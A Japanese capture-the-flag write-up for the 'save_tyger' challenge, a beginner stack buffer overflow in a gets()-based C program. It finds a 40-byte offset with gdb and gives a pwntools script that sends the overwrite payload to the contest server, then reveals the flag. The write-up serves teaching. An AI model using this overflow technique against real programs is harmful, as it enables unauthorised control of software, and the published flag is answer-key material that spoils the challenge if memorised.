# save_tyger
初歩的なバッファオーバーフロー問題．ソースファイルを見てみると<br><br>

~~~
int main(){
	long pass;
	char buf[32];
	pass = 0;
	printf("Oh no, someone stole our one and only Tyger! :noo:\n");
	printf("Would you help us save him?\n");
	gets(buf);
	if(pass == 0xabadaaab){
		printf("It worked!\n");
~~~
<br>
passに0xabadaaabを代入できれば突破できそう．ここまでわかれば後はpassを書き換えるためのオフセットを知ることと，ペイロードを作成することの2つをこなせばよい．<br><br>
オフセットを探す際には，いつも通りgdbを活用する．ブレークポイントはmain関数に設置<br><br>

![スクリーンショット](https://user-images.githubusercontent.com/64766627/183295807-815fb818-be4a-421a-afd5-09d4131b4ad0.png)<br><br>

オフセットはgets(buf)にて，何文字目からpassの塗りつぶしが始まるかを表している．ひとまず，50文字のパターンを生成し，入力に使ってみる．↓の画像はget命令が実行される部分で50文字のパターンを入力しているところ．<br><br>

![スクリーンショット](https://user-images.githubusercontent.com/64766627/183379211-4f894b29-1baa-456e-b7eb-02cd4fa6695f.png)<br><br>

get命令の2つ先に，0xabadaaabと一致するか比較するcmp命令が存在する．ここの直前まで進めて，比較対象の\[rbp-0x8\]を確認してみる．(16進数であることに注意)<br><br>

![スクリーンショット](https://user-images.githubusercontent.com/64766627/183380120-402c24a1-3c73-4f1a-a220-06668d3ecc4c.png)<br><br>

これで`AA0AAFAAbA`がpassに書き込まれていることが確認できた．パターン検索`patto 
AA0AAFAAbA`で，オフセットが40であることがわかる．ここまで来ればあとはペイロードを作るだけだ．<br><br>

ペイロード作成はいたってシンプルで，接続先指定，送信，出力表示の3つを行うだけである．書き換えたい値`0xabadaaab`についてはリトルエンディアンであることに注意して書く．↓こんな感じ．同じディレクトリにtyger_solve1.pyあり．<br><br>

~~~
from pwn import *

#テスト
#p=process("./save_tiger")

#接続先
p=remote("litctf.live", 31786)

#送信内容
p.sendline("A"*40+"\xab\xaa\xad\xab")

#出力表示(一回に一行しか表示されないので連打してます)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
~~~
<br><br>

実行すればflagが入手できる

<details>
<summary>答え</summary>
LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}<br><br>

![スクリーンショット](https://user-images.githubusercontent.com/64766627/183384594-64157968-68ed-47b2-a44d-178772a42adb.png)

</details>